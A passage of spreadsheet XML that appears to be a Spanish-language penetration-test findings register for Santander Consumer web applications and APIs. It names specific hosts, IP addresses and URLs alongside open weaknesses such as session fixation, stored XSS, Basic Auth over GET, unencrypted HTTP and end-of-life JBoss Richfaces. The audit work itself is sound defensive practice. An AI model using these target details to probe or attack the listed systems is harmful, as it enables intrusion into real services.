    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional se puede implementar un procedimiento para controlar los documentos a publicar, con el fin de garantizar que los mismos no contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social o Phishing dirigidos a determinados usuarios.</t>
  </si>
  <si>
    <t>MAN-675171c086437e5a65e4abab</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-VE-001</t>
  </si>
  <si>
    <t>Uso de software vulnerable JBoss Richfaces</t>
  </si>
  <si>
    <t>https://64.76.89.146:9090/factoring/a4j/g/3_3_3.Final</t>
  </si>
  <si>
    <t>El software de terceros son programas que cubren necesidades concretas para una organización o empresa. Hay decenas de miles de proyectos de código abierto en Internet para desarrollar estas librerías y también muchas comerciales de código cerrado. Los investigadores de seguridad descubren periódicamente las vulnerabilidades del proyecto y sus librerías y las ponen a su disposición mediante un proceso de divulgación de su elección. Aunque es fácil encontrar exploits ya escritos para muchas vulnerabilidades conocidas, otras vulnerabilidades requieren un esfuerzo concentrado para desarrollar un exploit personalizado.
Durante las pruebas realizadas, se identifica el uso del componente JBoss Richfaces en su versión 3.3.3 bajo el framework JBoss Seam.
Este software se encuentra afectado por vulnerabilidades críticas en todas sus versiones, y actualmente, se encuentra fuera de desarrollo, por lo que no recibe nuevas actualizaciones.
Dado que los principales componentes afectados, Paint2DResource y a4j:mediaOutput, no se han encontrado utilizándose en la aplicación, la criticidad se reduce a “Media”, sin embargo, si en el futuro se hace uso de alguno de estos componentes, la aplicación quedará expuesta a vulnerabilidades de Ejecución Remota de Código. Así mismo, en caso de identificarse nuevas vulnerabilidades sobre posibles componentes en uso, dado que el software se encuentra fuera del periodo de vida, no recibirá actualizaciones de seguridad, y la aplicación quedará vulnerable y sin corrección oficial.</t>
  </si>
  <si>
    <t>Debido a que el software se encuentra en estado de EOL (End of Life) no existen actualizaciones del producto. Se recomienda migrar el entorno a un Framework alternativo sin vulnerabilidades publicadas, y con actualizaciones periódicas. Además, se recomienda establecer un sistema de actualizaciones periódicas para evitar posibles nuevas vulnerabilidades descubiertas.</t>
  </si>
  <si>
    <t>Un atacante puede aprovechar las vulnerabilidades publicadas para explotarlas en las aplicaciones vulnerables. Richfaces 3.3.3: https://security.snyk.io/package/maven/org.richfaces:richfaces-a4j Adicionalmente, la falta de actualización en los componentes de un aplicativo aumenta la probabilidad de fallos de compatibilidad y rendimiento a largo plazo, empeorando el estado total del aplicativo, y dificultando la actualización de otros componentes sobre los que se puede encontrar nuevas vulnerabilidades.</t>
  </si>
  <si>
    <t>Tal como lo indica el mismo informe de vulnerabilidade, el aplicativo tiene medidas de evitan aprovechar la vulnerabilidad identificada:
No se identifican vulnerabilidades de inyección. Aunque los parámetros de entrada admiten caracteres especiales, la aplicación controla diferentes estructuras utilizadas para la creación de ejecuciones JavaScript, y no se identifican puntos donde se procesen inyecciones SQL, o ejecuciones de código remotas, o de comandos.
Se implementan medidas contra ataques entre sitios web, y tokens que dificultan la automatización de ataques, y reutilización de peticiones.</t>
  </si>
  <si>
    <t>MAN-6751735b86437e5a65e4b57c</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-002</t>
  </si>
  <si>
    <t>Incorrecta gestión de errores</t>
  </si>
  <si>
    <t>http://64.76.89.146:9090/factoring</t>
  </si>
  <si>
    <t>La ausencia de un correcto control de captura y manejo de errores en la aplicación presenta múltiples problemas de seguridad. La problemática más común suele ser la revelación de información interna en mensajes de error, tales como volcados, o información interna de la base de datos, información específica de la tecnología utilizada, volcados de pila, etc.
Durante las pruebas realizadas, se identifica que la aplicación no gestiona correctamente los errores de Java, llegando a mostrar la pila de debug, así como información muy relevante para el atacante, revelando todas las rutas de funcionalidades del aplicativo</t>
  </si>
  <si>
    <t>Se deben capturar y controlar todas las excepciones producidas en la aplicación, o en los sistemas que las sustentan, evitando proporcionar información útil a un posible atacante, como tecnologías utilizadas por la aplicación, o datos de carácter sensible. Los errores deben ser genéricos, mostrando a muy alto nivel, el problema que origina el mensaje, como por ejemplo “Los datos introducidos no son válidos”, “No se encuentra la ruta indicada”, o “Método HTTP no permitido”.</t>
  </si>
  <si>
    <t>Con la información exfiltrada en errores, si no son correctamente gestionados, un atacante puede obtener información interna de la aplicación relativa a su funcionamiento interno, además de información interna sobre las tecnologías utilizadas para sustentar la aplicación en caso de que los errores producidos muestren información acerca del motivo del error. Dada esta información, el atacante podrá realizar ataques especialmente dirigidos, con mayor probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan. En casos en los que el error no muestra información adicional relativa al sistema, aun así, puede crear mala imagen percibida por el usuario, y generar desconfianza sobre el uso de la aplicación.</t>
  </si>
  <si>
    <t>1° Fecha: 09/01/2025</t>
  </si>
  <si>
    <t>MAN-675173d186437e5a65e4b57d</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-AP-003</t>
  </si>
  <si>
    <t>Fijación de sesión</t>
  </si>
  <si>
    <t xml:space="preserve">La Fijación de Sesión (Session Fixation) es un ataque que permite a un atacante secuestrar una sesión de usuario válida. El ataque explota una limitación en la forma en que la aplicación web gestiona la cookie o identificador de sesión. Al autenticar un usuario, no se asigna un nuevo identificador de sesión, lo que permite usar un identificador existente. 
El ataque consiste en obtener un identificador de sesión válido (por ejemplo, conectándose a la aplicación), inducir a un usuario a autenticarse con ese identificador, y luego secuestrar la sesión validada del usuario con el conocimiento del identificador utilizado. El atacante debe proporcionar un identificador de sesión legítimo de la aplicación web e intentar hacer que el navegador de la víctima lo use.
Durante las pruebas realizadas se observa que, al iniciar sesión sobre la aplicación, esta no asigna una nueva cookie de sesión, sino que aprovecha la que el usuario posee, y le otorga validez a la misma, de modo que, si un usuario posee una cookie comprometida, la aplicación dará validez a dicha cookie.
Para demostrar la vulnerabilidad, primero se accede al primer frontal no autenticado de la aplicación desde el navegador Google Chrome, simulando un atacante
</t>
  </si>
  <si>
    <t>Se recomienda que la aplicación no asigne validez de sesión a las cookies utilizadas por el usuario a la hora de realizar el inicio de sesión, sino que, a la hora de iniciar sesión en la aplicación, el servidor de aplicación se encargue de generar un nuevo identificador de sesión válido para el usuario y asignárselo, asegurando que se además se encuentre protegido con los atributos de seguridad de las cookies, como HttpOnly, SameSite, y Secure.</t>
  </si>
  <si>
    <t>Un atacante puede engañar a una víctima mediante otros ataques o ingeniería social, para utilizar una cookie de sesión válida de la aplicación. Una vez la víctima inicie sesión en la aplicación, utilizará la cookie proporcionada por el atacante, y se le asignará la sesión del usuario logado. Dado que el atacante posee la cookie utilizada que ahora posee validez, ya que ha sido quien la proporciona en un inicio, podrá acceder a la aplicación web suplantando la sesión del usuario de la víctima que ha iniciado sesión.</t>
  </si>
  <si>
    <t>MAN-6751746f86437e5a65e4b57e</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-004</t>
  </si>
  <si>
    <t>Comunicaciones no cifradas</t>
  </si>
  <si>
    <t>Cuando un usuario opera con un aplicativo web, se produce un intercambio de información. Esta información viaja a través de un canal de comunicaciones, al que otros usuarios también pueden acceder y utilizar. Debido a este motivo, la información entre un cliente y el aplicativo web debe enviarse de manera cifrada utilizando el protocolo SSL adecuado, y certificados. 
Si el canal de comunicación no se protege, cualquier usuario con acceso a la red entre el cliente y el servidor de aplicación podrá observar la información transmitida, comprometiendo la confidencialidad, cuyo impacto dependerá en base a la sensibilidad de los datos transmitidos. 
Debido a que se trata de un entorno Preproductivo, se reduce la criticidad a Media, entendiendo que las comunicaciones en Producción se cifrarán.
Durante las pruebas realizadas, se ha podido observar que las comunicaciones entre el cliente y la aplicación Factoring, http://64.76.89.146:9090/factoring, no se encuentran cifradas, siendo enviadas a través del protocolo HTTP</t>
  </si>
  <si>
    <t>Se recomienda habilitar y forzar las comunicaciones con la aplicación y sus dominios a través del protocolo HTTPS, asegurando el envío de la información a través de un canal cifrado. En caso de que la aplicación se disponga en una red pública, se deberán utilizar certificados firmados por una Autoridad de certificación. En caso de que se disponga en redes internas, se admite el uso de certificados autofirmados, asegurando la correcta cadena de confianza, y que el certificado es válido y no caducará inminentemente.</t>
  </si>
  <si>
    <t>El envío de información a través de un canal no cifrado entre el cliente y el servidor de aplicación supondrá el envío de la información en claro. Esto podría permitir a un atacante en la red leer la información transmitida, accediendo potencialmente a información sensible, y exfiltrando la información.</t>
  </si>
  <si>
    <t>El ambiente Productivo debe contar con su certificado digital y la protección del WAF Coporativo del Banco</t>
  </si>
  <si>
    <t>MAN-67517a2b86437e5a65e4b595</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-005</t>
  </si>
  <si>
    <t>Cookie de sesión sin atributo HttpOnly</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario.
Durante las pruebas de Hacking Ético se observa que la Cookie de autenticación en la plataforma, “JESSSIONID” no dispone del atributo HttpOnly, siendo accesible con JavaScript, y susceptible a ataques XSS, o el acceso por medio de plugins maliciosos</t>
  </si>
  <si>
    <t>La ausencia del atributo HttpOnly permite el acceso a las cookies a través de JavaScript, permitiendo el robo de las mismas a través de ataques XSS (Cross-Site Scripting), o posible extensiones de navegador vulnerables. 
El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación.</t>
  </si>
  <si>
    <t>MAN-67517a9486437e5a65e4b5a3</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-006</t>
  </si>
  <si>
    <t>Exposición de código fuente XHTML</t>
  </si>
  <si>
    <t>Las aplicaciones implementadas en JBoss Seam permiten la interacción de los usuarios con sus servicios a través de las diferentes funcionalidades expuestas en los endpoints .seam. 
La estructura de estos servicios .seam está definida parcialmente en su fichero análogo .xhtml, pero normalmente no es necesario el acceso a los mismos para la ejecución de las funcionalidades. 
El acceso a los ficheros .xhtml por parte de un actor malintencionado, podría proporcionar información respecto a los componentes a4j utilizados, las diferentes acciones definidas en el servicio, y el comportamiento general del mismo, facilitando la ejecución de ataques dirigidos. Así mismo, como dichos ficheros no son necesarios para la ejecución, es habitual no implementar un control de acceso sobre los mismos, por lo que un atacante no autenticado podría obtener información detallada respecto a servicios autenticados.
Durante las pruebas de Hacking Ético se observa la posibilidad de acceso a los ficheros .xhtml de JBoss Seam</t>
  </si>
  <si>
    <t>Se recomienda restringir el acceso a los diferentes ficheros .xhtml de la plataforma, delegando la ejecución de los servicios a través de los ficheros .seam. En caso de ser imprescindible el acceso a algún fichero .xhtml, este deberá implementar un control de accesos robusto en el que valide la sesión del usuario antes de proveer algún tipo de información.</t>
  </si>
  <si>
    <t>El acceso a los ficheros .xhtml por parte de un actor malintencionado, podría proporcionar información respecto a los componentes a4j utilizados, las diferentes acciones definidas en el servicio, y el comportamiento general del mismo, facilitando la ejecución de ataques dirigidos. Así mismo, como dichos ficheros no son necesarios para la ejecución, es habitual no implementar un control de acceso sobre los mismos, por lo que un atacante no autenticado podría obtener información detallada respecto a servicios autenticados, y enumerar los servicios presentes en el aplicativo.</t>
  </si>
  <si>
    <t>MAN-67517ad686437e5a65e4b5a4</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-AP-007</t>
  </si>
  <si>
    <t>Subida de ficheros Offices con Macros</t>
  </si>
  <si>
    <t>Las aplicaciones en ocasiones contienen funcionalidades de subida de ficheros para cumplir con tareas relacionadas con su lógica de negocio, como la carga de datos a través de ficheros, el adjunto de documentación, o el envío y compartición de ficheros. Estas funcionalidades son puntos potenciales de subida de malware e infección de la aplicación, por lo que deben implementar exhaustivos controles del tamaño, contenido, y extensión del fichero subido. 
La ausencia de estos controles podría permitir a un atacante subir malware, o como en este caso, ficheros Office con Macros, que, en caso de ser abiertos, podrían conllevar la ejecución de una carga maliciosa que comprometa al sistema o usuario que ha abierto el fichero.
Durante las pruebas de Hacking Ético se observa la posibilidad de subir al aplicativo ficheros .XLS (Excel) con Macros adjuntas, incluyendo líneas y funciones que podrían implicar la ejecución de código ante una apertura exitosa</t>
  </si>
  <si>
    <t>La subida al aplicativo de ficheros Office con Macros adjuntas, podría implicar la posterior ejecución de las mismas, bien por un usuario que acceda al aplicativo, o por el sistema al realizar la lectura del fichero. Estas macros pueden contener ejecución de programas maliciosos, o de comandos en el sistema, pudiendo llevar al compromiso de la integridad del servidor de aplicación.</t>
  </si>
  <si>
    <t>Se recomienda implementar validaciones y análisis del contenido de los ficheros subidos a la aplicación, impidiendo la subida de ficheros con contenido malicioso, como Macros para ficheros Office, Entidades para ficheros XML, o firmas de software malicioso. Este análisis puede ser previo a la subida al aplicativo, mediante el uso de una sandbox intermedia donde se envíe el archivo, sea analizado, y posteriormente subido al aplicativo, o puede ser inmediatamente posterior a la subida, siendo este subido sobre un directorio que sea constantemente analizado por un software antivirus, y elimine el fichero ante la detección de contenido malicioso.</t>
  </si>
  <si>
    <t>MAN-67517c0f86437e5a65e4b5a5</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-008</t>
  </si>
  <si>
    <t>La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de la misma, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página.
Durante el ejercicio de Hacking Ético se ha identifica el uso de los atributos ‘unsafe-inline’ y ‘unsafe-eval’ sobre la directiva “script-src” de la cabecera Content-Security-Policy, admitiendo la inserción, reflejo, e interpretación de código de código JavaScript y con ello, eliminando las mitigaciones contra posibles vulnerabilidades Cross-Site Scripting:</t>
  </si>
  <si>
    <t>La ausencia o incorrección de la cabecera Content Security Policy podría permitir a un atacante realizar ataques XSS en el caso de que la aplicación tuviera alguna vulnerabilidad, o cargar recursos maliciosos externos. El Cross-Site Scripting o XSS es una técnica que permite a un atacante cargar código JavaScript en el navegador de la víctima.</t>
  </si>
  <si>
    <t>Se esta revisando con el equipo del WAF la implementación</t>
  </si>
  <si>
    <t>MAN-67517c5486437e5a65e4b5a6</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-009</t>
  </si>
  <si>
    <t>Cookie de sesión sin atributo Secure</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito.
Durante las pruebas de Hacking Ético se observa que la Cookie de autenticación en la plataforma, “JESSSIONID” no dispone del atributo Secure, admitiendo su transmisión a través de medios no cifrados, y en dicho caso, facilitando su usurpación</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión almacenados a través de las cookies mediante el atributo de seguridad "Secure". De esta manera se evita que el identificador de sesión pueda ser transmitido por canales no cifrados. 
La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>El robo de cookies intervinientes con la generación de la sesión de un usuario podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación.</t>
  </si>
  <si>
    <t>MAN-67517e5d86437e5a65e4b5cc</t>
  </si>
  <si>
    <t>SC-24-CNMPO-021-CO-010</t>
  </si>
  <si>
    <t>Se ha detectado que la función "Autocompletar" se encuentra habilitada en varios de los formularios de la aplicación. Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación, facilitando la recuperación de datos de carácter sensible, o de utilidad para la operación sobre la plataforma.
Durante las pruebas realizadas, se identifica que el formulario de inicio de sesión posee varios campos sin el atributo “autocompletar=off”, habilitando el cacheo de datos introducidos previamente, y mostrándolos al interactuar con dicho campo, recordando datos de carácter sensible como números de documentos de identidad</t>
  </si>
  <si>
    <t>Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría a usuarios y atacantes posteriores revisar los datos introducidos en los diferentes formularios de la aplicación, comprometiendo la confidencialidad de los mismos. Estos datos son de carácter sensible, y algunos de ellos, como el correo electrónico, podría utilizarse en posteriores ataques de ingeniería social.</t>
  </si>
  <si>
    <t>MAN-6762eb6f0c973c5860ee4749</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-020-VE-001</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co:8001/O
riginacionPROD</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha comprobado que el sistema remoto está ejecutando una
versión del software de Bizagi BPM que se encuentra desactualizada (versión 11.2.5.0811). 
</t>
  </si>
  <si>
    <t>MAN-6788fa000c973c5860eff565</t>
  </si>
  <si>
    <t>CO-24-CNMPO-022-CO-001</t>
  </si>
  <si>
    <t>Cross-site scripting almacenado</t>
  </si>
  <si>
    <t>https://sccfc22ga.cocf.pre.corp</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas contra la API otorgada para esta revisión, se ha podido determinar que es posible inyectar código JavaScript en diversos campos de texto que serán remitidos por correo electrónico, los cuales acabarán ejecutándose por parte del explorador utilizado al visualizar el correo desencadenando la vulnerabilidad de Cross-site Scripting (XSS) almacenado. Además, es posible incluir en dichos campos URLs maliciosas, que podrían ser utilizadas para engañar al usuario.
Es importante tener en cuenta que tanto el cambio de correo electrónico como la inserción de una URL maliciosa (en este caso remitida como clave provisional), podrían conllevar a una vulnerabilidad adicional de Spear Phishing. Ya que no es el objetivo de este ejercicio, y que esto es posible debido a una mala validación de los datos de entrada, se comenta esta vulnerabilidad como posibilidad adicional dentro del XSS almacenado.</t>
  </si>
  <si>
    <t>Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos. Existen dos estrategias generales para implantar este filtro:
• Filtrado de lista blanca: Se valida la información recibida en función de la información esperada.
• Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”. De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities:
• (") sería &amp;quot
• (') sería &amp;apos
• (&lt;) sería &amp;lt
• (&gt;) sería &amp;gt</t>
  </si>
  <si>
    <t>Mediante la inyección de código que permite la presente vulnerabilidad, un atacante podría generar direcciones URLs, o formularios HTML, utilizando código malintencionado incrustado en los valores de los parámetros, con la finalidad de realizar alguna de las siguientes acciones:
• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario que, normalmente, se encuentra almacenado a través de una cookie.
• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible.
• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el sistema de la víctima.
Ejecución de acciones de forma "transparente" para el usuario: Interactuar con la aplicación y realizar acciones sin el conocimiento del usuario.</t>
  </si>
  <si>
    <t>MAN-6788fa4d0c973c5860eff566</t>
  </si>
  <si>
    <t>CO-24-CNMPO-022-CO-002</t>
  </si>
  <si>
    <t>Uso de Autenticación Básica con método GET</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha observado que la API auditada realiza una petición para la generación del Payload para el Enrollment con Autenticación Básica en una llamada con el método GET, permitiendo la filtración de las credenciales del usuario utilizado.
La API revisada consta de una primera petición llamada “createPayload”, petición necesaria para generar un payload (un código de autorización según se ha podido comprobar, que hace de token) que será utilizado como medio de autenticación para la petición posterior de Enrollment llamada “Enrolamiento”.
Esta petición realizada por la API se puede paralizar gracias a un proxy intermedio, permitiendo su visualización y descubriendo del uso del método inseguro de envío de credenciales Basic Auth en la variable Authorization.
Si se decodifica este identificador en base64, se pueden obtener las credenciales en texto plano del usuario utilizadas</t>
  </si>
  <si>
    <t>De manera general se recomienda no utilizar el método de "Autenticación Básica" en el proceso de autenticación de los usuarios. 
Utilizar sistemas de autenticación robustos, que autentiquen al usuario mediante identificadores generados de manera dinámica por un algoritmo de hash robusto. Además, estos identificadores no deben contener las credenciales de los usuarios o partes de estas.</t>
  </si>
  <si>
    <t>Un atacante que tuviese acceso a registros (log) de comunicación de red HTTP (ataques de intermediario: MitM) o a los logs de ciertos sistemas intermedios, por ejemplo proxies y/o servidor de BackEnd, podría acceder a los datos de estos registros y decodificar las credenciales transmitidas en texto claro. 
Por otro lado, este método de autenticación no es compatible con el uso de medidas de protección específicas para evitar ataques de fuerza bruta.</t>
  </si>
  <si>
    <t>CRM Hubspot</t>
  </si>
  <si>
    <t>MAN-67b8555cdd7b5726115d2b28</t>
  </si>
  <si>
    <t>SC-25-CNMPO-001-AP-001</t>
  </si>
  <si>
    <t>4.1</t>
  </si>
  <si>
    <t>https://api.hubapi.com</t>
  </si>
  <si>
    <t>La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito.
En este caso específico, ha sido posible modificar el campo createdate y añadir payloads XSS potencialmente ejecutables debido a la ausencia de validación de los campos. No se ha podido verificar la ejecución de los payloads XSS, ya que se trata de una API. Sin embargo, si esta vulnerabilidad se llegara a reflejar en una interfaz web, la criticidad de la vulnerabilidad podría aumentar significativamente, elevándose a un nivel alto.
Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que no se están aplicando las validaciones de la lógica de negocio pertinentes a la hora de añadir y modificar campos en la aplicacion.</t>
  </si>
  <si>
    <t>Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación.</t>
  </si>
  <si>
    <t>Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos por la misma.</t>
  </si>
  <si>
    <t>MAN-67b8558edd7b5726115d2b29</t>
  </si>
  <si>
    <t>SC-25-CNMPO-001-CO-002</t>
  </si>
  <si>
    <t>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(Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques.
Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13.</t>
  </si>
  <si>
    <t>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 https://www.openssl.org/source/</t>
  </si>
  <si>
    <t>QA-WAS-da020af7-8438-4ec1-9108-caccf52e0842</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/assets/img/test/</t>
  </si>
  <si>
    <t>QA-WAS-c74d2bfa-beea-4b7a-b004-59631dce44a9</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/</t>
  </si>
  <si>
    <t>QA-WAS-1a7280e1-0ea9-468f-b9cd-a2a27b144ba1</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/</t>
  </si>
  <si>
    <t>QA-WAS-7e55fa57-fd85-442a-b251-f64b019e4f83</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/2239/</t>
  </si>
  <si>
    <t>QA-WAS-47a80ec7-1010-4548-bc8a-9f6b0b73e303</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/3841/</t>
  </si>
  <si>
    <t>QA-WAS-5ee6b3ae-b2e7-40eb-a936-95e11cba5a0d</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/4385/</t>
  </si>
  <si>
    <t>QA-WAS-0e514120-52ee-429d-91e2-c72738e4b333</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/4566/</t>
  </si>
  <si>
    <t>QA-WAS-cd23932b-e7aa-4fec-a4ee-47f98a8e1517</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/4646/</t>
  </si>
  <si>
    <t>QA-WAS-28241340-063b-4143-ad06-ba16df4f517e</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/4900/</t>
  </si>
  <si>
    <t>QA-WAS-314b5af7-9c12-447f-ad11-d96e17eb6f03</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/5724/</t>
  </si>
  <si>
    <t>QA-WAS-ede93700-e87a-4303-9c99-40db8fa1b366</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/</t>
  </si>
  <si>
    <t>QA-WAS-cbbc5d25-78c2-41f0-91dc-0b1024ea5e13</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/</t>
  </si>
  <si>
    <t>QA-WAS-7c6d7fb8-9f72-4a6f-b1a9-e210da8b6263</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/scripts/</t>
  </si>
  <si>
    <t>QA-WAS-724a76ed-3524-44e9-aa73-7a966d99ff5a</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/styles/</t>
  </si>
  <si>
    <t>QA-WAS-66582372-2dfe-4d3a-9f33-2142fe978a9f</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/</t>
  </si>
  <si>
    <t>QA-WAS-61a0c007-3308-48f7-897a-5bb424cbab87</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/scripts/</t>
  </si>
  <si>
    <t>QA-WAS-a75df110-0563-4df8-8149-387932e9fdb7</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/styles/</t>
  </si>
  <si>
    <t>QA-WAS-9a0fcb83-88c0-4ffd-ac98-13df4aee52ad</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/</t>
  </si>
  <si>
    <t>QA-WAS-63e63a79-f5f0-4f5b-9d79-7504fe283a91</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/</t>
  </si>
  <si>
    <t>QA-WAS-4a2ac835-e060-4312-a444-1cad3b07db63</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/scripts/</t>
  </si>
  <si>
    <t>QA-WAS-d9bb0091-6462-4a3e-b48b-2ba07fef6fa3</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/styles/</t>
  </si>
  <si>
    <t>QA-WAS-d7deb97d-47b9-4375-9821-0b4ac5f889c1</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/</t>
  </si>
  <si>
    <t>QA-WAS-7f6a624a-d522-402b-b785-1832f95b60d0</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/</t>
  </si>
  <si>
    <t>QA-WAS-ce207a0b-76a1-4807-b1ae-ad8d9e08fa8b</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/</t>
  </si>
  <si>
    <t>QA-WAS-7ab7ba34-4077-46d9-aa59-978daa8b6455</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/</t>
  </si>
  <si>
    <t>QA-WAS-c319946a-6d5f-403a-95e7-3206d2ae762a</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/</t>
  </si>
  <si>
    <t>QA-WAS-271954e7-8f0b-47d5-bd4f-c23e66896b6d</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/fontawesome/</t>
  </si>
  <si>
    <t>QA-WAS-effb62ac-d4f4-453d-908f-9721fbfbc106</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/</t>
  </si>
  <si>
    <t>QA-WAS-28a8e568-2094-46c0-bdaa-a19406080b1b</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/all/</t>
  </si>
  <si>
    <t>QA-WAS-6cc50c0e-7f37-4321-9785-f2351c80241b</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/social/</t>
  </si>
  <si>
    <t>QA-WAS-31a2535f-857b-45b3-9138-4914417c8ac6</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/core/admin/js/</t>
  </si>
  <si>
    <t>QA-WAS-6d760fd2-ffab-4307-9d9e-2a351c14450b</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/</t>
  </si>
  <si>
    <t>QA-WAS-24b1a5cc-5742-43dd-b44f-f30ac0642f5b</t>
  </si>
  <si>
